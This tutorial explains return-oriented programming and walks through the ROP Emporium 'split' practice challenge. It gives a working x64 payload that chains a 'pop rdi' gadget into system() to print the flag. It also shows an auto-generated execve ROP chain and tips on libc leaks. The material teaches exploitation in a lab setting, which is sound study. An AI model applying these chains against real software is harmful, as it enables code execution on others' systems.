# ROP - Return Oriented Programming

***

## Theory

ROP (Return-oriented programming) is an exploitation technique of code-reuse based on the **research for blocks of instructions inside a binary**, these blocks are called **gadget**.

These pieces of code generally end with the mnemonic instruction : `ret`.

We will be able to chain these gadgets (ending with ret) in the stack to execute a sequence of actions, called **ROP Chain**.

If the **NX bit** (or **DEP**) is set, this technique will allow us to bypass that. We can go further with a ROP Chain and bypass the **ASLR**, by [leaking the addresses of the libc functions](https://nuts7.github.io/return-oriented-programming/#ropme).

## Practice

By way of simple example, we will use the [ROP Emporium split](https://ropemporium.com/challenge/split.html) challenge (x64).

The statement tells us that :

* Only the NX protection is activated, we can check it (The stack does not have the `X` flag so it's not executable) :

```py
❯ readelf -l /dev/shm/split

En-têtes de programme :
  Type           Décalage           Adr.virt           Adr.phys.
                 Taille fichier     Taille mémoire      Fanion Alignement
  				<...snip...>
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
```

* The binary contains a string `/bin/cat flag.txt`, let's take advantage of it to get his address :

```py
❯ ROPgadget --binary=split --string='/bin/cat flag.txt'
Strings information
============================================================
0x0000000000601060 : /bin/cat flag.txt
```

* The `system()` function is present in the GOT (Global Offset Table) of the program :

```py
❯ gdb -q split
GEF for linux ready, type `gef' to start, `gef config' to configure
89 commands loaded for GDB 8.2.1 using Python engine 3.7
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from split...(no debugging symbols found)...done.
gef➤  start
<...snip...>
gef➤  got system

GOT protection: Partial RelRO | GOT functions: 6
 
[0x601020] system@GLIBC_2.2.5  →  0x400566
```

Our goal is to display the flag, by crafting `system("/bin/cat flag.txt")`.

In doing so, we need the address of a gadget that allows us to pass the `/bin/cat flag.txt` argument to the `system()` function (`pop rdi ; ret`) :

```py
❯ ropper --file=split --search='pop rdi; ret'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret

[INFO] File: split
0x00000000004007c3: pop rdi; ret; 
```

We can setup arguments to functions with these gadgets because the **ABI** (Application Binary Interface) defines these calling conventions :

| x86       | x86\_64   | Argument Number |
| --------- | --------- | --------------- |
| `pop ebx` | `pop rdi` | arg0            |
| `pop ecx` | `pop rsi` | arg1            |
| `pop edx` | `pop rdx` | arg2            |
| `pop esi` | `pop r10` | arg3            |
| `pop edi` | `pop r8`  | arg4            |
| `pop ebp` | `pop r9`  | arg5            |

Therefore we can use these tools to extract gadgets from a program :

* [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
* [Roppper](https://github.com/sashs/Ropper)
* [one\_gadget](https://github.com/david942j/one\_gadget) (tool for finding one gadget RCE in libc.so.6)

Here is our final payload :

```py
❯ python2 -c "from pwn import *; print 'A' * 40 + p64(0x4007c3) + p64(0x601060) + p64(0x400566)" | ./split # pop rdi ; ret + /bin/cat flag.txt + systemsplit by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

A diagram to summarize our exploit:

![schema](https://i.imgur.com/xGExZwp.png)

**Some Tips (Bonus) :**

* ROPgadget allows us to generate a ROP Chain automatically with a python2 script as output :

```py
❯ ROPgadget --binary=nuts --ropchain
<...snip...>
- Step 5 -- Build the ROP chain

        #!/usr/bin/env python2
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = ''

        p += pack('<Q', 0x0000000000405924) # pop rsi ; ret
	<...snip...>
        p += pack('<Q', 0x0000000000469d14) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004045f2) # syscall
```

* During a ROP Chain with a libc leak, we can use [libc-database](https://github.com/niklasb/libc-database) to retrieve the libc used by the binary (there is an [online release](https://libc.blukat.me)) :

```py
❯ ./find puts 690 # symbol address leaked
libc6_2.23-0ubuntu10_amd64.so (local-56d992a0342a67a887b8dcaae381d2cc51205253)
```

## References

* **FR**
* https://nuts7.github.io/return-oriented-programming/
* https://nuts7.github.io/ropemporium-writeups/
* https://www.youtube.com/watch?v=zRI8diZTEB0
* https://www.dailysecurity.fr/return\_oriented\_programming/
* https://www.youtube.com/watch?v=8skdPGCEuxE
* https://zestedesavoir.com/articles/1424/decouvrez-lattaque-return-oriented-programming/
* https://beta.hackndo.com/return-oriented-programming/
* **EN**
* https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address
* https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming
* https://ctf101.org/binary-exploitation/return-oriented-programming/
